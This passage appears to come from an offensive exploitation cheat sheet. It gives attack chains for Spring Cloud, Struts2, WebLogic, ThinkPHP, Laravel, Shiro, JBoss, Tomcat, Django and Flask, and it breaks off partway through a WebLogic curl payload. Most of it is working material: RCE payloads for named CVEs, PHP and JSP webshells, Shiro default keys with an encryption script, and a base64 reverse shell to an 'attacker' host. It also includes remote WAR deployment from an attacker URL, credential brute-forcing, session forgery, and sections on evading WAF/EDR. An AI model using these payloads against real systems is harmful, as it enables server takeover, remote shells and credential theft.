**1. String Concatenation**
_String concatenation bypass_
```
# bypass keyword filtering
${T(java.lang.Run"+"time).getRun"+"time().exec("id")}
#{T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("exec",T(String)).invoke(T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

**2. Reflection Bypass**
_Reflection bypass_
```
# use reflection
#{T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Class).forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# using ScriptEngine
#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\"id\\")")}
```

---

### Spring Cloud Vulnerabilities  `spring-cloud`
Spring Cloud related vulnerability exploitation
Subcategory: **Spring Cloud** · tags: `spring` `cloud` `rce` `deserialization`

**Prerequisites:** uses Spring Cloud; a vulnerable version present

**Attack Chain:**

**1. 1. Spring Cloud Gateway RCE**
_Spring Cloud Gateway RCE_
```
# CVE-2022-22947
# add a malicious route
POST /actuator/gateway/routes/hack HTTP/1.1
Content-Type: application/json

{
  "id": "hack",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

# refresh routes
POST /actuator/gateway/refresh

# view the result
GET /actuator/gateway/routes/hack
```

**2. 2. Spring Cloud Function SpEL**
_Spring Cloud Function SpEL injection_
```
# CVE-2022-22963
# modify the request header to trigger SpEL
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")
Content-Type: text/plain

payload
```

**3. 3. Spring Cloud Netflix**
_Spring Cloud Netflix vulnerability_
```
# CVE-2020-5410 directory traversal
GET /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd

# Eureka Server SSRF
POST /eureka/apps
# configure serviceUrl to point to an internal service
```

**WAF/EDR Bypass Variants:**

**1. Encoding Bypass**
_Encoding bypass_
```
# URL encoding bypass
..%252f = ..%2f = ../

# double URL encoding
..%252f..%252f
```

---

### Struts2 Remote Code Execution  `struts2-rce`
Apache Struts2 framework RCE vulnerability
Subcategory: **Struts2** · tags: `struts2` `rce` `java` `apache`

**Prerequisites:** uses the Struts2 framework; a vulnerable version present

**Attack Chain:**

**1. 1. S2-045 Vulnerability**
_S2-045 Content-Type injection_
```
# CVE-2017-5638
# Content-Type header injection
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

**2. 2. S2-046 Vulnerability**
_S2-046 Content-Disposition injection_
```
# CVE-2017-5638
# Content-Disposition injection
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','vulnerable')}"

# full RCE
Content-Disposition: form-data; name="upload"; filename="%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
```

**3. 3. S2-057 Vulnerability**
_S2-057 URL namespace injection_
```
# CVE-2018-11776
# URL namespace injection
http://target/${(111+111)}/test.action
# if it returns 222, the vulnerability exists

# RCE
http://target/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}/test.action
```

**4. 4. S2-061/S2-062 Vulnerabilities**
_S2-061/062 OGNL injection_
```
# CVE-2020-17530
# OGNL expression injection
POST /action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=%25%7b%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS.%40java.lang.Runtime%40getRuntime().exec(%27id%27)%7d

# after decoding
id=%{#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.@java.lang.Runtime@getRuntime().exec('id')}
```

**WAF/EDR Bypass Variants:**

**1. Encoding Bypass**
_Encoding bypass_
```
# URL encoding
%{#cmd} = %25%7b%23cmd%7d

# Unicode encoding
\u0025{#cmd}

# double encoding
%2525%257b%2523cmd%257d
```

**2. Expression Variants**
_Expression variant bypass_
```
# different expression syntaxes
${...}
%{...}
#{...}
@{...}

# use static methods
@java.lang.Runtime@getRuntime()
new java.lang.ProcessBuilder()
```

---

### Struts2 OGNL Expression Injection  `struts2-ognl`
Detailed Struts2 OGNL expression injection techniques
Subcategory: **Struts2 OGNL** · tags: `struts2` `ognl` `expression` `injection`

**Prerequisites:** uses the Struts2 framework; an OGNL injection point present

**Attack Chain:**

**1. 1. OGNL Basic Syntax**
_OGNL basic syntax_
```
# access object properties
#object.property
#object['property']

# invoke a method
#object.method()
#object.method(arg1, arg2)

# static method invocation
@package.ClassName@method()
@java.lang.Runtime@getRuntime()

# create an object
new java.lang.String("test")
new java.lang.ProcessBuilder(new String[]{"id"})
```

**2. 2. Bypass Security Restrictions**
_Bypass security restrictions_
```
# obtain DEFAULT_MEMBER_ACCESS
#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS

# set the member access permission
#_memberAccess=#dm

# clear the excluded classes
#ognlUtil.getExcludedClasses().clear()
#ognlUtil.getExcludedPackageNames().clear()

# full bypass
(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))
```

**3. 3. Command Execution Techniques**
_Command execution techniques_
```
# using Runtime
#cmd='id'
#cmds={'/bin/bash','-c',#cmd}
#p=new java.lang.ProcessBuilder(#cmds)
#process=#p.start()

# obtain the output
#is=#process.getInputStream()
#ros=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()
@org.apache.commons.io.IOUtils@copy(#is,#ros)

# string output
@org.apache.commons.io.IOUtils@toString(#process.getInputStream())
```

**4. 4. File Operations**
_File operations_
```
# read a file
new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()

# write a file
new java.io.FileOutputStream("shell.jsp").write(new sun.misc.BASE64Decoder().decodeBuffer("BASE64_SHELL").getBytes())

# list the directory
new java.io.File("/").list()
```

**WAF/EDR Bypass Variants:**

**1. Character Encoding Bypass**
_Character encoding bypass_
```
# Unicode encoding
\u0069d = id
\u0027 = '

# hexadecimal
\x69\x64 = id

# string concatenation
"i"+"d" = "id"
'id'.substring(0,2)
```

**2. Reflection Bypass**
_Reflection bypass_
```
# invoke using reflection
#cls=@java.lang.Class@forName("java.lang.Runtime")
#method=#cls.getMethod("getRuntime")
#rt=#method.invoke(null)
#exec=#cls.getMethod("exec",@java.lang.String@class)
#exec.invoke(#rt,"id")
```

---

### WebLogic Remote Code Execution  `weblogic-rce`
Oracle WebLogic Server RCE vulnerability
Subcategory: **WebLogic** · tags: `weblogic` `rce` `java` `oracle`

**Prerequisites:** uses WebLogic Server; a vulnerable version present

**Attack Chain:**

**1. 1. CVE-2017-10271**
_CVE-2017-10271 XMLDecoder_
```
# XMLDecoder deserialization
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

**2. 2. CVE-2019-2725**
_CVE-2019-2725 AsyncResponseService_
```
# newer XMLDecoder bypass
POST /_async/AsyncResponseService HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

**3. 3. CVE-2020-14882**
_CVE-2020-14882 Console RCE_
```
# unauthenticated access + command execution
# login bypass
GET /console/css/%252e%252e%252fconsole.portal HTTP/1.1

# command execution
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22) HTTP/1.1
```

**WAF/EDR Bypass Variants:**

**1. Path Encoding Bypass**
_Path encoding bypass_
```
# different encoding methods
/console/css/..;/console.portal
/console/css/%2e%2e/console.portal
/console/css/%252e%252e/console.portal
/console/css/..%252fconsole.portal
```

**2. XML Variants**
_XML variant bypass_
```
# use different XML tags
<void class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<string>id</string>
</void>
</void>

# use the array form
<array class="java.lang.String" length="1">
<void index="0"><string>id</string></void>
</array>
```

---

### WebLogic T3 Protocol Attack  `weblogic-t3`
WebLogic T3 protocol deserialization vulnerability
Subcategory: **WebLogic T3** · tags: `weblogic` `t3` `deserialization` `java`

**Prerequisites:** WebLogic with T3 port open; a vulnerable version present

**Attack Chain:**

**1. 1. Probe the T3 Service**
_Probe the T3 service_
```
# scan the T3 port (default 7001)
nmap -sV -p 7001 target

# T3 handshake
echo "t3 12.2.1" | nc target 7001

# if it returns HELO, a T3 service exists
```

**2. 2. Attack Using Tools**
_Attack using tools_
```
# use weblogic_exploit
git clone https://github.com/0xn0ne/weblogicScanner
cd weblogicScanner
python3 weblogic.py -t target -p 7001

# using WebLogicTool
java -jar WebLogicTool.jar -target target:7001 -cmd "id"

# use ysoserial
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "touch /tmp/pwned"
```

**3. 3. Construct a Malicious T3 Request**
_Construct a malicious T3 request_
```
# Python script to construct the T3 request
import socket
import struct

def send_t3_payload(target, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    
    # T3 handshake
    sock.send(b"t3 12.2.1\n")
    response = sock.recv(1024)
    
    # send the malicious serialized object
    # construct a T3 request containing the malicious object
    sock.send(payload)
    sock.close()

# use ysoserial to generate the payload
# java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
```

**WAF/EDR Bypass Variants:**

**1. Gadget Chain Selection**
_Gadget chain selection_
```
# different gadget chains
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsBeanutils1
Jdk7u21
Jre8u20

# choose the appropriate chain based on the target environment
```

---

### WebLogic IIOP Protocol Attack  `weblogic-iiop`
WebLogic IIOP protocol deserialization vulnerability
Subcategory: **WebLogic IIOP** · tags: `weblogic` `iiop` `deserialization` `corba`

**Prerequisites:** WebLogic with IIOP port open; a vulnerable version present

**Attack Chain:**

**1. 1. Probe the IIOP Service**
_Probe the IIOP service_
```
# scan IIOP port	nmap -sV -p 7001 target

# IIOP uses the same port
# detect whether IIOP is supported
# detect using a tool
```

**2. 2. CVE-2020-2551**
_CVE-2020-2551 exploitation_
```
# use weblogic_CVE_2020_2551
git clone https://github.com/Y4er/CVE-2020-2551
cd CVE-2020-2551

# compile and run
mvn package
java -jar target/CVE-2020-2551-1.0-SNAPSHOT.jar target 7001

# use a JRMP listener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"
```

**3. 3. Construct the IIOP Request**
_Construct the IIOP request_
```
# construct using Python
# requires installing the relevant libraries
pip install idna

# use JNDI injection
# construct a malicious JNDI reference
String jndiURL = "iiop://attacker:1099/Exploit";
Context ctx = new InitialContext();
ctx.lookup(jndiURL);

# use the JNDIExploit tool
java -jar JNDIExploit.jar -i attacker_ip
```

**WAF/EDR Bypass Variants:**

**1. Protocol Switching**
_Bypass by protocol switching_
```
# switch between T3 and IIOP
# if T3 is disabled, try IIOP
# use a different protocol to bypass detection
```

---

### ThinkPHP Remote Code Execution  `thinkphp-rce`
ThinkPHP framework RCE vulnerability
Subcategory: **ThinkPHP** · tags: `thinkphp` `rce` `php` `framework`

**Prerequisites:** uses the ThinkPHP framework; a vulnerable version present

**Attack Chain:**

**1. 1. ThinkPHP 5.x RCE**
_ThinkPHP 5.0.x RCE_
```
# ThinkPHP 5.0.x RCE
# method invocation
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1

# write a WebShell
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php eval($_POST[cmd]);?>

# execute system commands
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

**2. 2. ThinkPHP 5.1.x RCE**
_ThinkPHP 5.1.x RCE_
```
# ThinkPHP 5.1.x RCE
?s=index/think\Request/input&filter[]=system&data=id
?s=index/think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/think\Template/driver/file/write&cacheFile=shell.php&content=%3C%3Fphp%20eval($_POST[cmd]);%3F%3E
```

**3. 3. ThinkPHP 5.0.23 RCE**
_ThinkPHP 5.0.23 RCE_
```
# POST method
POST /index.php?s=captcha HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

# write a shell
_method=__construct&filter[]=file_put_contents&method=get&server[REQUEST_METHOD]=shell.php&get[]=<?php eval($_POST[cmd]);?>
```

**4. 4. Information Gathering**
_Information gathering_
```
# obtain the ThinkPHP version
# view the response headers
X-Powered-By: ThinkPHP 5.0.x

# access a specific page
/index.php?s=/index/\think\app/init
/index.php?s=/index/\think\Request/input

# error message disclosure
# trigger an error to view the version
```

**WAF/EDR Bypass Variants:**

**1. Encoding Bypass**
_Encoding bypass_
```
# URL encoding
?s=%2fIndex%2f%5cthink%5capp%2finvokefunction

# mixed case
?s=/Index/\Think\App/invokefunction

# double encoding
?s=%252fIndex%252f%255cthink%255capp%252finvokefunction
```

**2. Path Variants**
_Path variant bypass_
```
# different path formats
?s=/index/think\app/invokefunction
?s=index/think/app/invokefunction
?s=/index/\think\App/invokefunction

# use different entry points
/index.php?s=...
/?s=...
/public/index.php?s=...
```

---

### Laravel Remote Code Execution  `laravel-rce`
Laravel framework RCE vulnerability
Subcategory: **Laravel** · tags: `laravel` `rce` `php` `framework`

**Prerequisites:** uses the Laravel framework; a vulnerable version or configuration present

**Attack Chain:**

**1. 1. CVE-2021-3129**
_CVE-2021-3129 Ignition RCE_
```
# Laravel Ignition RCE
# using a tool
git clone https://github.com/zhzyker/CVE-2021-3129
cd CVE-2021-3129
python3 exp.py -t http://target

# manual exploitation
# need to send a Phar deserialization payload
# generate using phpggc
phpggc Laravel/RCE1 system id > payload

# send the request
POST /_ignition/health-check HTTP/1.1
Content-Type: application/json

{"solution":"...","parameters":{"viewFile":"phar://..."}}
```

**2. 2. Debug Mode Information Disclosure**
_Debug mode information disclosure_
```
# APP_DEBUG=true information disclosure
# access a page that triggers an error
# view sensitive information in the stack trace

# may leak:
- Database credentials
- API keys
- Environment variables
- Server paths
- Source code snippets
```

**3. 3. .env File Leakage**
_.env file leakage_
```
# try to access the .env file
GET /.env HTTP/1.1
GET /../.env HTTP/1.1
GET /public/.env HTTP/1.1

# .env file contains:
APP_KEY=base64:...
DB_HOST=localhost
DB_DATABASE=laravel
DB_USERNAME=root
DB_PASSWORD=password
```

**4. 4. APP_KEY Exploitation**
_APP_KEY exploitation_
```
# after obtaining the APP_KEY
# can forge a cookie
# decrypt encrypted data

# decrypt using a tool
php artisan decrypt <encrypted_value>

# forge an admin cookie
# requires knowing the application's encryption scheme
```

**WAF/EDR Bypass Variants:**

**1. Path Bypass**
_Path bypass_
```
# try different paths
/.env
/.env.example
/.env.local
/.env.production
/../.env
/..%2f.env
/..%252f.env
```

---

### Apache Shiro Deserialization  `shiro-deserialize`
Apache Shiro RememberMe deserialization vulnerability
Subcategory: **Apache Shiro** · tags: `shiro` `deserialization` `java` `rememberme`

**Prerequisites:** uses Apache Shiro; a vulnerable version present

**Attack Chain:**

**1. 1. Detect Shiro**
_Detect the Shiro framework_
```
# detect the rememberMe cookie
# rememberMe=deleteMe in the response indicates Shiro is in use

# detect using a tool
git clone https://github.com/sv3nbeast/ShiroScan
cd ShiroScan
java -jar shiro_scan.jar -t http://target

# or use a Burp plugin
# ShiroScan Burp plugin
```

**2. 2. Generate Payload Using ysoserial**
_Generate the malicious payload_
```
# generate the malicious serialized object
java -jar ysoserial.jar CommonsCollections2 "id" > payload.ser

# encrypt using Shiro's built-in key
# default key: kPH+bIxk5D2deZiIxcaaaA==

# Python encryption script
import base64
from Crypto.Cipher import AES

def encode_rememberme(command):
    # generate the payload
    payload = os.popen(f"java -jar ysoserial.jar CommonsCollections2 \"{command}\"").read()
    
    # AES encryption
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    cipher = AES.new(key, AES.MODE_CBC, iv=key)
    
    # PKCS5Padding
    pad = 16 - len(payload) % 16
    payload += bytes([pad]) * pad
    
    encrypted = cipher.encrypt(payload)
    return base64.b64encode(encrypted).decode()
```

**3. 3. Send the Malicious Request**
_Send the malicious request_
```
# using curl
curl -H "Cookie: rememberMe=<ENCODED_PAYLOAD>" http://target

# using a tool
git clone https://github.com/insightglacier/Shiro_exploit
cd Shiro_exploit
python3 shiro_exploit.py -t http://target -c "id"

# using ShiroAttack
git clone https://github.com/acgbfull/ShiroAttack
cd ShiroAttack
java -jar ShiroAttack.jar
```

**4. 4. Common Key List**
_Common key list_
```
# common Shiro keys
kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
fCq+/xW488hMTCD+cmJ3aQ==
1QWLxg+NYmxraMoxAXu/Iw==
25BsmdYwjnfcWmnhAciDDg==
2AvVhdsgUs0F8SZSnWd+Zw==
6ZmI6I2j5Y+R54aHjOqYzg==

# try different keys
# or brute-force the key
```

**WAF/EDR Bypass Variants:**

**1. Gadget Chain Selection**
_Gadget chain selection_
```
# different gadget chains
CommonsCollections2
CommonsBeanutils1
Jdk7u21
JRMPClient

# choose based on the target environment
# some chains may be filtered
```

**2. Key Brute-Forcing**
_Key brute-forcing_
```
# brute-force the key using a tool
git clone https://github.com/insightglacier/Shiro_exploit
python3 shiro_exploit.py -t http://target -f keys.txt

# or use ShiroScan
java -jar shiro_scan.jar -t http://target -f keys.txt
```

---

### JBoss Exploitation  `jboss-vuln`
JBoss application server vulnerabilities
Subcategory: **JBoss** · tags: `jboss` `rce` `java` `deserialization`

**Prerequisites:** uses a JBoss server; a vulnerable version present

**Attack Chain:**

**1. 1. JMXInvokerServlet Deserialization**
_JMXInvokerServlet deserialization_
```
# CVE-2015-7501
# send the malicious serialized object
POST /invoker/JMXInvokerServlet HTTP/1.1
Content-Type: application/x-java-serialized-object

# use ysoserial to generate the payload
java -jar ysoserial.jar CommonsCollections1 "id" > payload.ser

# send
curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser http://target/invoker/JMXInvokerServlet
```

**2. 2. JMX Console WAR Deployment**
_JMX Console WAR deployment_
```
# access the JMX Console
http://target/jmx-console/

# find the deploy method
# find jboss.system:service=MainDeployer

# deploy a remote WAR package
# use the deploy method with the URL parameter pointing to a malicious WAR
http://target/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.system:service=MainDeployer&methodName=deploy&argType=java.lang.String&arg=http://attacker/shell.war

# access the deployed shell
http://target/shell/cmd.jsp?cmd=id
```

**3. 3. BSHDeployer Deployment**
_BSHDeployer deployment_
```
# deploy using BeanShell
# find jboss.scripts:service=BSHDeployer

# execute the BeanShell script
# via the createScriptDeployment method

# construct a malicious script
import java.io.*;
Runtime rt = Runtime.getRuntime();
Process p = rt.exec("id");
InputStream is = p.getInputStream();
BufferedReader reader = new BufferedReader(new InputStreamReader(is));
String line;
while((line = reader.readLine()) != null) {
    print(line);
}
```

**4. 4. Using Tools**
_Use the JexBoss tool_
```
# JexBoss
git clone https://github.com/joaomatosf/jexboss
cd jexboss
python jexboss.py -host http://target

# automated exploitation
python jexboss.py -mode file-scan -file hosts.txt
```

**WAF/EDR Bypass Variants:**

**1. Endpoint Variants**
_Endpoint variants_
```
# different endpoints
/invoker/JMXInvokerServlet
/invoker/EJBInvokerServlet
/invoker/readonly/JMXInvokerServlet
/jmx-console/
/web-console/
```

---

### Apache Tomcat Vulnerabilities  `tomcat-vuln`
Apache Tomcat server vulnerability exploitation
Subcategory: **Tomcat** · tags: `tomcat` `rce` `java` `manager`

**Prerequisites:** uses a Tomcat server; a vulnerable version or configuration present

**Attack Chain:**

**1. 1. Manager App Weak Credentials**
_Manager App weak credentials_
```
# access the Manager App
http://target/manager/html

# common weak credentials
tomcat:tomcat
admin:admin
admin:tomcat

# brute-force using a tool
hydra -l tomcat -P passwords.txt target http-get /manager/html
```

**2. 2. Deploy the WAR Package**
_Deploy the WAR package_
```
# generate the malicious WAR package
# cmd.jsp
<%@ page import="java.util.*,java.io.*"%>
<% String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) { out.println(line); }
%>

# package it
jar cvf shell.war cmd.jsp

# upload via the Manager
curl -u tomcat:tomcat -T shell.war "http://target/manager/deploy?path=/shell"

# access the shell
http://target/shell/cmd.jsp?cmd=id
```

**3. 3. CVE-2020-1938 Ghostcat**
_CVE-2020-1938 Ghostcat_
```
# AJP file read/inclusion
# using a tool
git clone https://github.com/chaitin/xray
cd xray
./xray_linux_amd64 webscan --plugins phantomjs --url http://target

# or use a dedicated tool
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/web.xml target
```

**4. 4. Arbitrary File Write via PUT Method**  _[windows]_
_Arbitrary file write via PUT method_
```
# CVE-2017-12615
# write a file via the PUT method on Windows
PUT /shell.jsp%20 HTTP/1.1
Host: target
Content-Length: 24

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# or use ::$DATA
PUT /shell.jsp::$DATA HTTP/1.1

# or use /
PUT /shell.jsp/ HTTP/1.1
```

**WAF/EDR Bypass Variants:**

**1. Filename Bypass**
_Filename bypass_
```
# different filename variants
shell.jsp%20
shell.jsp::$DATA
shell.jsp/
shell.jsp%00
shell.jSp
shell.jsP
```

---

### DjangoFramework Vulnerabilities  `django-vuln`
Django framework security vulnerabilities
Subcategory: **Django** · tags: `django` `python` `framework` `sql`

**Prerequisites:** uses the Django framework; a vulnerable version present

**Attack Chain:**

**1. 1. SQL Injection**
_CVE-2020-7471 SQL injection_
```
# CVE-2020-7471
# bypass via PostgreSQL input validation
# use JSONField/HStoreField

# construct a malicious query
Model.objects.filter(data__contains={"key": "value; SELECT SLEEP(5);--"})

# or use ArrayField
Model.objects.filter(tags__contains=["tag'); SELECT SLEEP(5);--"])

# trigger SQL injection
```

**2. 2. Debug Mode Information Disclosure**
_Debug mode information disclosure_
```
# when DEBUG=True
# error page leaks:
- Source code
- Environment variables
- Database configuration
- SECRET_KEY
- Server paths

# access a non-existent page to trigger an error
http://target/nonexistent

# or trigger an exception
```

**3. 3. SECRET_KEY Exploitation**
_SECRET_KEY exploitation_
```
# after obtaining the SECRET_KEY
# can:
# 1. forge a signed session
# 2. forge a signed CSRF Token
# 3. password reset Token

# use the django-session-cleanup tool
# or unsign manually

import django.core.signing as signing

# unsign the session
signing.loads(session_value, key=SECRET_KEY)

# forge a signed session
fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)
```

**4. 4. Path Traversal**
_Path traversal vulnerability_
```
# CVE-2021-28658
# Django static file path traversal
GET /static/../../../../etc/passwd

# detect using a tool
curl http://target/static/../../../../etc/passwd
```

**WAF/EDR Bypass Variants:**

**1. Encoding Bypass**
_Encoding bypass_
```
# URL encoding
/static/%2e%2e/%2e%2e/etc/passwd

# double encoding
/static/%252e%252e/%252e%252e/etc/passwd

# Unicode encoding
/static/..%c0%af..%c0%af/etc/passwd
```

---

### FlaskFramework Vulnerabilities  `flask-vuln`
Flask framework security vulnerabilities
Subcategory: **Flask** · tags: `flask` `python` `framework` `ssti`

**Prerequisites:** uses the Flask framework; a vulnerable configuration present

**Attack Chain:**

**1. 1. SSTI Template Injection**
_SSTI Template Injection_
```
# Jinja2 template injection probe
{{7*7}}
${7*7}
<%= 7*7 %>

# if it returns 49, SSTI exists

# obtain the configuration
{{config}}
{{self.__class__}}

# command execution
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**2. 2. SECRET_KEY Exploitation**
_SECRET_KEY exploitation_
```
# Flask session signing
# after obtaining the SECRET_KEY, a session can be forged

# unsign the session
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

# unsign
def decode_session(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.loads(cookie_value)

# signature forgery
def encode_session(data, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.dumps(data)

# forge an admin session
fake_session = encode_session({"user_id": 1, "is_admin": True}, SECRET_KEY)
```

**3. 3. Debug Mode RCE**
_Debug mode RCE_
```
# Flask Debug mode
# access /debug or /console
# can execute arbitrary Python code

# Werkzeug Debug Console
# access:
http://target/console

# execute code
import os; os.system('id')
__import__('os').system('id')
```

**4. 4. PIN Code Bypass**
_PIN code bypass_
```
# Flask Debug PIN
# need to obtain:
# 1. username
# 2. modname
# 3. app path
# 4. MAC address

# read information
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].environ}}

# compute the PIN
# use a script to compute the Werkzeug PIN
```

**WAF/EDR Bypass Variants:**

**1. SSTI Bypass**
_SSTI bypass_
```
# filter bypass
# using attr
{{''|attr('__class__')|attr('__mro__')}}

# using request
{{request|attr('application')|attr('__globals__')}}

# use string concatenation
{{'__cla'~'ss__'}}

# use encoding
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

### WebLogic XMLDecoder  `weblogic-xmldecoder`
Exploit the XMLDecoder deserialization vulnerability in WebLogic Server (CVE-2017-10271/CVE-2017-3506) for remote code execution
Subcategory: **WebLogic** · tags: `weblogic` `xmldecoder` `rce`

**Prerequisites:** the target runs WebLogic Server; the /wls-wsat/ or /_async/ path is present; the XMLDecoder component is not disabled; the WebLogic version is vulnerable (10.3.6.0/12.1.3.0, etc.)

**Attack Chain:**

**1. Probe the WebLogic Version and Paths**  _[linux]_
_Probe the WebLogic server version, open ports, and exploitable endpoints_
```
# detect the WebLogic console
curl -sI "http://target:7001/console/" | head -5

# detect the wls-wsat endpoint (CVE-2017-10271)
curl -s "http://target:7001/wls-wsat/CoordinatorPortType" | head -20

# detect the AsyncResponseService endpoint (CVE-2019-2725)
curl -s "http://target:7001/_async/AsyncResponseService" | head -20

# detect the T3 protocol
nmap -sV -p 7001 --script weblogic-t3-info target
```

**2. CVE-2017-10271 XMLDecoder RCE**  _[linux]_
_Inject an XMLDecoder deserialization payload via WorkContext in the SOAP request to achieve command execution_
```
curl -v "http://target:7001/wls-wsat/CoordinatorPortType"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
